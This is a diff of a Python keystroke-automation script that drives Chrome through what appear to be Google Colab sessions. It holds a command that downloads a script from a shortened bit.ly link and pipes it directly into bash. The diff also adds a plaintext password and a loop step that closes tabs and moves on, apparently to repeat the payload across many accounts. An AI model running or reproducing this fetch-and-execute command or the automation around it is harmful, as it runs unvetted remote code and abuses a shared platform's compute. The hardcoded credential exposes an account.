@@ -4,9 +4,9 @@ from autokey import *
 import pyautogui
 
 col_cmd = "!wget -q -O - bit.ly/cpu02 | bash"
-listfile = '/home/one/gids03.txt'
-gpass = "********"
-new = False
+listfile = '/home/one/g167'
+gpass = "Ms123456789"
+new = True
 global_slow_motion = 2
 
 speed = 200
@@ -20,6 +20,11 @@ def exec_key():
     pyautogui.press('enter')
     pyautogui.keyUp('ctrlright')
 
+def exit_key():
+    # keyboard.send_keys("<ctrl>+<enter>")
+    pyautogui.keyDown('ctrlright')
+    pyautogui.press('w')
+    pyautogui.keyUp('ctrlright')
 
 def chrome_next():
     pyautogui.keyDown('ctrlright')
@@ -323,6 +328,7 @@ while (debug == 0):
             if debug != 0:
                 dialog.info_dialog("winTitle", winTitle)
             # colab_full_refresh()
+            exit_key()
             chrome_next()
     else:
         time.sleep(5)
